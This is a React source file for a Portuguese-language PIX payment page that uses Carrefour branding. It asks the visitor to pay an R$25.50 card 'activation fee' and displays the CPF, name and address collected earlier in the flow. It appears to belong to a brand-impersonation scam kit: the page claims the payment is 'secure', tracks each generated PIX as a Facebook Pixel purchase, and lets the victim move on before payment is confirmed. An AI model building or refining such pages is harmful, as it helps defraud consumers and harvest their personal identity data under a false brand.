import { useState, useEffect } from 'react';
import { motion } from 'framer-motion';
import { useNavigate } from 'react-router-dom';
import { useUserStore } from '../../store/userStore';
import { gerarPIX } from '../../services/pix';
import { trackPurchase } from '../../services/facebookPixel';
import ProgressBar from '../Shared/ProgressBar';
import Logo from '../Shared/Logo';
import { QRCodeSVG } from 'qrcode.react';
import { Loader2, Copy, CheckCircle, Shield, Lock, ArrowRight, ChevronDown, ChevronUp, Clock, FileText, AlertCircle } from 'lucide-react';

export default function PaymentPage() {
  const navigate = useNavigate();
  const { 
    nomeCompleto,
    telefone,
    cpf,
    endereco,
    valorEntrega,
    setPixData,
    setEtapaAtual,
    pixCode,
    pixQrCode,
    transactionId
  } = useUserStore();

  const [loading, setLoading] = useState(false);
  const [pixGerado, setPixGerado] = useState(!!pixCode);
  const [copiado, setCopiado] = useState(false);
  const [qrCodeExpandido, setQrCodeExpandido] = useState(false);
  const [tempoRestante, setTempoRestante] = useState(30 * 60);

  // Verificar localStorage ao carregar
  useEffect(() => {
    const pixSalvo = localStorage.getItem('pix_data');
    if (pixSalvo) {
      try {
        const dados = JSON.parse(pixSalvo);
        const agora = new Date().getTime();
        const expiraEm = new Date(dados.expiresAt).getTime();
        
        if (expiraEm > agora + 60000) {
          console.log('Reutilizando PIX salvo do localStorage');
          setPixData(dados.pixCode, dados.pixQrCode, dados.transactionId);
          setPixGerado(true);
          
          const diferenca = Math.max(0, Math.floor((expiraEm - agora) / 1000));
          setTempoRestante(diferenca);
          return;
        } else {
          localStorage.removeItem('pix_data');
        }
      } catch (e) {
        console.error('Erro ao ler PIX do localStorage:', e);
        localStorage.removeItem('pix_data');
      }
    }

    if (!pixGerado && transactionId) {
      handleGerarPIX();
    } else if (!pixGerado) {
      handleGerarPIX();
    }
  }, []);

  // Timer countdown
  useEffect(() => {
    if (pixGerado && tempoRestante > 0) {
      const interval = setInterval(() => {
        setTempoRestante((prev) => {
          if (prev <= 1) {
            clearInterval(interval);
            return 0;
          }
          return prev - 1;
        });
      }, 1000);

      return () => clearInterval(interval);
    }
  }, [pixGerado, tempoRestante]);

  const formatarTempo = (segundos) => {
    const minutos = Math.floor(segundos / 60);
    const segs = segundos % 60;
    return `${String(minutos).padStart(2, '0')}:${String(segs).padStart(2, '0')}`;
  };

  const handleGerarPIX = async () => {
    setLoading(true);
    try {
      const dadosPix = {
        amount: valorEntrega || 25.50,
        customer: {
          name: nomeCompleto || 'Cliente',
          email: '',
          phone: telefone.replace(/\D/g, ''),
          document: { number: cpf }
        },
        address: {
          street: endereco.logradouro,
          streetNumber: endereco.numero,
          complement: endereco.complemento,
          zipCode: endereco.cep,
          neighborhood: endereco.bairro,
          city: endereco.cidade,
          state: endereco.estado
        }
      };

      const resultado = await gerarPIX(dadosPix, transactionId);
      setPixData(resultado.pixCode, resultado.qrCode, resultado.transactionId);
      setPixGerado(true);
      
      const expiresAt = resultado.expiresAt || new Date(Date.now() + 30 * 60 * 1000).toISOString();
      const expiraEm = new Date(expiresAt).getTime();
      const agora = new Date().getTime();
      const diferenca = Math.max(0, Math.floor((expiraEm - agora) / 1000));
      setTempoRestante(diferenca);
      
      localStorage.setItem('pix_data', JSON.stringify({
        pixCode: resultado.pixCode,
        pixQrCode: resultado.qrCode,
        transactionId: resultado.transactionId,
        expiresAt: expiresAt,
        valor: dadosPix.amount
      }));
      
      trackPurchase(dadosPix.amount, 'BRL', resultado.transactionId);
    } catch (error) {
      console.error('Erro ao gerar PIX:', error);
      // Em desenvolvimento, mesmo com erro, usar mock para visualização
      if (import.meta.env.DEV || window.location.hostname === 'localhost') {
        console.warn('Usando PIX mock devido ao erro (modo desenvolvimento)');
        const mockResult = {
          transactionId: 'TXN' + Date.now(),
          pixCode: '00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-426614174000520400005303986540525.505802BR5925CARREFOUR SOLUCOES FINAN6009SAO PAULO62070503***6304',
          qrCode: '00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-426614174000520400005303986540525.505802BR5925CARREFOUR SOLUCOES FINAN6009SAO PAULO62070503***6304',
          expiresAt: new Date(Date.now() + 30 * 60 * 1000).toISOString()
        };
        setPixData(mockResult.pixCode, mockResult.qrCode, mockResult.transactionId);
        setPixGerado(true);
        setTempoRestante(30 * 60);
        localStorage.setItem('pix_data', JSON.stringify({
          pixCode: mockResult.pixCode,
          pixQrCode: mockResult.qrCode,
          transactionId: mockResult.transactionId,
          expiresAt: mockResult.expiresAt,
          valor: dadosPix.amount
        }));
      } else {
        alert('Erro ao gerar PIX. Tente novamente.');
      }
    } finally {
      setLoading(false);
    }
  };

  const handleCopiarPix = () => {
    navigator.clipboard.writeText(pixCode);
    setCopiado(true);
    setTimeout(() => setCopiado(false), 2000);
  };

  const handleContinuar = () => {
    setEtapaAtual('virtual');
    navigate('/virtual');
  };

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <div className="bg-white border-b border-gray-200 sticky top-0 z-50 shadow-sm">
        <div className="container mx-auto px-4 py-4">
          <Logo size="md" />
        </div>
      </div>
      
      <div className="container mx-auto px-4 py-8">
        <ProgressBar etapaAtual="payment" />
        
        <div className="max-w-4xl mx-auto mt-8">
          {/* Título Principal */}
          <div className="text-center mb-8">
            <h1 className="text-3xl sm:text-4xl font-bold text-gray-900 mb-2">
              Pagamento Seguro
            </h1>
            <p className="text-base text-gray-600">
              Complete o pagamento para finalizar a ativação do seu cartão
            </p>
          </div>

          <div className="grid md:grid-cols-3 gap-6">
            {/* Coluna Principal - PIX */}
            <div className="md:col-span-2 space-y-6">
              {/* Timer */}
              {pixGerado && pixCode && tempoRestante > 0 && (
                <div className="bg-gradient-to-r from-red-600 to-red-700 rounded-lg p-5 text-white shadow-lg">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-3">
                      <Clock className="w-6 h-6" />
                      <div>
                        <p className="text-sm text-white/90">Tempo restante</p>
                        <p className="text-3xl font-bold font-mono">{formatarTempo(tempoRestante)}</p>
                      </div>
                    </div>
                    <AlertCircle className="w-6 h-6 text-white/80" />
                  </div>
                </div>
              )}

              {/* Card de Pagamento */}
              {loading ? (
                <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-12 text-center">
                  <Loader2 className="w-12 h-12 text-carrefour-blue animate-spin mx-auto mb-4" />
                  <p className="text-lg font-semibold text-gray-900">Gerando código de pagamento...</p>
                  <p className="text-sm text-gray-600 mt-2">Aguarde alguns instantes</p>
                </div>
              ) : pixGerado && pixCode ? (
                <div className="bg-white rounded-lg shadow-sm border border-gray-200 overflow-hidden">
                  {/* Header do Card */}
                  <div className="bg-gradient-to-r from-carrefour-blue to-primary-dark px-6 py-4">
                    <div className="flex items-center justify-between text-white">
                      <div>
                        <p className="text-sm text-white/90 mb-1">Pagamento via PIX</p>
                        <p className="text-2xl font-bold">R$ {(valorEntrega || 25.50).toFixed(2).replace('.', ',')}</p>
                      </div>
                      <div className="text-right">
                        <p className="text-xs text-white/80 mb-1">ID da Transação</p>
                        <p className="text-sm font-mono">{transactionId?.substring(0, 8) || 'N/A'}...</p>
                      </div>
                    </div>
                  </div>

                  <div className="p-6">
                    {/* Código PIX */}
                    <div className="mb-6">
                      <label className="block text-sm font-semibold text-gray-700 mb-2">
                        Código PIX (Copie e cole no app do seu banco)
                      </label>
                      <div className="bg-gray-50 border-2 border-gray-200 rounded-lg p-4 mb-3">
                        <p className="text-sm font-mono text-gray-900 break-all select-all leading-relaxed">
                          {pixCode}
                        </p>
                      </div>
                      <button
                        onClick={handleCopiarPix}
                        className="w-full bg-carrefour-blue hover:bg-blue-700 text-white font-semibold py-3.5 px-4 rounded-lg transition-colors flex items-center justify-center gap-2"
                      >
                        {copiado ? (
                          <>
                            <CheckCircle className="w-5 h-5" />
                            Código Copiado
                          </>
                        ) : (
                          <>
                            <Copy className="w-5 h-5" />
                            Copiar Código PIX
                          </>
                        )}
                      </button>
                    </div>

                    {/* QR Code Expansível */}
                    <div className="border-t border-gray-200 pt-6">
                      <button
                        onClick={() => setQrCodeExpandido(!qrCodeExpandido)}
                        className="w-full flex items-center justify-between p-3 hover:bg-gray-50 rounded-lg transition-colors"
                      >
                        <span className="text-sm font-semibold text-gray-700">QR Code para escanear</span>
                        {qrCodeExpandido ? (
                          <ChevronUp className="w-5 h-5 text-gray-500" />
                        ) : (
                          <ChevronDown className="w-5 h-5 text-gray-500" />
                        )}
                      </button>
                      
                      {qrCodeExpandido && (
                        <motion.div
                          initial={{ height: 0, opacity: 0 }}
                          animate={{ height: 'auto', opacity: 1 }}
                          className="mt-4 pb-4"
                        >
                          <div className="bg-white p-6 rounded-lg border-2 border-gray-200 flex justify-center">
                            <QRCodeSVG value={pixCode} size={240} level="H" />
                          </div>
                        </motion.div>
                      )}
                    </div>
                  </div>
                </div>
              ) : null}

              {/* Instruções de Pagamento */}
              {pixGerado && pixCode && (
                <div className="bg-blue-50 border border-blue-200 rounded-lg p-5">
                  <h3 className="text-sm font-semibold text-gray-900 mb-3 flex items-center gap-2">
                    <FileText className="w-4 h-4 text-carrefour-blue" />
                    Como pagar com PIX
                  </h3>
                  <ol className="space-y-2 text-sm text-gray-700">
                    <li className="flex gap-2">
                      <span className="font-semibold text-carrefour-blue">1.</span>
                      <span>Abra o app do seu banco e selecione a opção PIX</span>
                    </li>
                    <li className="flex gap-2">
                      <span className="font-semibold text-carrefour-blue">2.</span>
                      <span>Escolha "Pix Copia e Cola" ou escaneie o QR Code</span>
                    </li>
                    <li className="flex gap-2">
                      <span className="font-semibold text-carrefour-blue">3.</span>
                      <span>Cole o código ou confirme o valor de <strong>R$ {(valorEntrega || 25.50).toFixed(2).replace('.', ',')}</strong></span>
                    </li>
                    <li className="flex gap-2">
                      <span className="font-semibold text-carrefour-blue">4.</span>
                      <span>Confirme o pagamento no app do seu banco</span>
                    </li>
                  </ol>
                </div>
              )}
            </div>

            {/* Sidebar - Resumo e Informações */}
            <div className="space-y-6">
              {/* Resumo do Pedido */}
              <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-5">
                <h3 className="text-base font-semibold text-gray-900 mb-4">Resumo do Pedido</h3>
                <div className="space-y-3 text-sm">
                  <div className="flex justify-between">
                    <span className="text-gray-600">Taxa de ativação</span>
                    <span className="font-semibold text-gray-900">R$ {(valorEntrega || 25.50).toFixed(2).replace('.', ',')}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-600">Envio do cartão físico</span>
                    <span className="text-gray-600">Incluso</span>
                  </div>
                  <div className="border-t border-gray-200 pt-3 flex justify-between">
                    <span className="font-semibold text-gray-900">Total</span>
                    <span className="text-xl font-bold text-carrefour-blue">R$ {(valorEntrega || 25.50).toFixed(2).replace('.', ',')}</span>
                  </div>
                </div>
              </div>

              {/* Informações do Cliente */}
              <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-5">
                <h3 className="text-base font-semibold text-gray-900 mb-4">Dados do Pagamento</h3>
                <div className="space-y-2 text-sm">
                  <div>
                    <p className="text-gray-600">Pagador</p>
                    <p className="font-medium text-gray-900">{nomeCompleto || 'N/A'}</p>
                  </div>
                  <div>
                    <p className="text-gray-600">CPF</p>
                    <p className="font-medium text-gray-900">{cpf || 'N/A'}</p>
                  </div>
                  {transactionId && (
                    <div>
                      <p className="text-gray-600">ID da Transação</p>
                      <p className="font-mono text-xs text-gray-700">{transactionId}</p>
                    </div>
                  )}
                </div>
              </div>

              {/* Segurança */}
              <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-5">
                <div className="flex items-center gap-2 mb-3">
                  <Shield className="w-5 h-5 text-green-600" />
                  <h3 className="text-base font-semibold text-gray-900">Pagamento Seguro</h3>
                </div>
                <div className="space-y-2 text-xs text-gray-600">
                  <div className="flex items-center gap-2">
                    <Lock className="w-3 h-3 text-green-600" />
                    <span>Criptografia SSL 256 bits</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <Shield className="w-3 h-3 text-green-600" />
                    <span>Certificado de Segurança</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <CheckCircle className="w-3 h-3 text-green-600" />
                    <span>Processado por gateway bancário</span>
                  </div>
                </div>
              </div>

              {/* Informações Importantes */}
              <div className="bg-amber-50 border border-amber-200 rounded-lg p-4">
                <div className="flex items-start gap-2">
                  <AlertCircle className="w-5 h-5 text-amber-600 flex-shrink-0 mt-0.5" />
                  <div className="text-xs text-amber-900">
                    <p className="font-semibold mb-1">Importante</p>
                    <p className="leading-relaxed">
                      O pagamento é processado automaticamente. Após a confirmação, seu cartão será ativado em até 2 minutos.
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Botão Continuar */}
          {pixGerado && pixCode && (
            <div className="mt-8 text-center">
              <button
                onClick={handleContinuar}
                className="bg-gradient-to-r from-carrefour-blue to-primary-dark hover:from-blue-700 hover:to-blue-800 text-white font-semibold text-lg py-4 px-8 rounded-lg transition-all duration-300 shadow-lg hover:shadow-xl inline-flex items-center gap-2"
              >
                Continuar para Cartão Virtual
                <ArrowRight className="w-5 h-5" />
              </button>
              <p className="text-xs text-gray-500 mt-3">
                Você pode continuar mesmo antes do pagamento ser confirmado
              </p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
